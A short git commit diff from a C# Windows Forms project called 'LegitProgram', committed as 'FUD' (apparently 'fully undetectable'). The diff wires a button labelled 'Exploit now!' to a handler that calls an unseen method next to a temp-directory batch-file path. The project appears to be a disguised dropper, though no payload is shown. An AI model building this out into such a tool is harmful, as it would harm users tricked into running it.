23870b1ababee706e787f35cfea21e2d35fe788f
Takaovi <50058811+Takaovi@users.noreply.github.com>
2021-04-02 02:02:31 +0300

    FUD 2.4.2021

--- LegitProgram/Form1.Designer.cs
+++ LegitProgram/Form1.Designer.cs
@@ -46,6 +46,7 @@
             this.button1.TabIndex = 0;
             this.button1.Text = "Exploit now!";
             this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
             // 
             // label1
             // 
--- LegitProgram/Form1.cs
+++ LegitProgram/Form1.cs
@@ -14,7 +14,7 @@ namespace LegitProgram
 
         string batchpath = Path.GetTempPath() + "file.bat";
 
-        private void button1_Click(object sender, EventArgs e)
+        private void button1_Click_1(object sender, EventArgs e)
         {
             method();
         }
